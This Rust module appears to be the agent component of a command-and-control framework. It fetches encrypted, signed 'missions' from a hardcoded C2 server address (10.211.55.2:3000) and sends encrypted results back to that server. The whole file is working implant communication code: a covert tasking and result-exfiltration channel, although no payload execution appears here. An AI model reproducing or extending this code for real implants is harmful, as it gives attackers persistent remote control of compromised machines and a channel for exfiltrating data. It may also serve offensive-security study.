pub mod missions {
    use common::{
        api,
        crypto::{SigningKey, VerifyingKey},
    };
    use log::{debug, error, info};

    use crate::AgentResult;

    // const C2_URL: &str = "http://localhost:3000";
    const C2_URL: &str = "http://10.211.55.2:3000";

    pub fn get_next(
        signing_key: &mut SigningKey,
        c2_verifying_key: &VerifyingKey,
    ) -> AgentResult<Option<api::Mission>> {
        debug!("Getting mission");
        let (private_key, crypto_negociation) = api::CryptoNegociation::new(signing_key);

        let response = ureq::get(&format!("{C2_URL}/missions"))
            .send_json(serde_json::to_value(&crypto_negociation)?)?;
        if response.status() == 204 {
            debug!("No mission");
            return Ok(None);
        }

        let crypto_message: api::CryptoMessage = response.into_json()?;
        crypto_message.verify(c2_verifying_key)?;
        let decrypted_data = crypto_message.decrypt(private_key)?;
        let mission: api::Mission =
            serde_json::from_slice(std::str::from_utf8(&decrypted_data)?.as_bytes())?;
        info!("Got mission: {mission}");

        Ok(Some(mission))
    }

    pub fn report(
        signing_key: &mut SigningKey,
        mission: api::Mission,
        result: &str,
    ) -> AgentResult<()> {
        info!("Reporting mission: {mission}");
        debug!("{result}");
        let crypto_message =
            api::CryptoMessage::new(signing_key, mission.public_key, result.as_bytes())?;

        let response = ureq::put(&format!("{C2_URL}/missions/{}", mission.id))
            .send_json(serde_json::to_value(&crypto_message)?)?;
        if response.status() != 202 {
            error!("Failed to report mission [{}]: {:#?}", mission.id, response);
        }
        Ok(())
    }
}
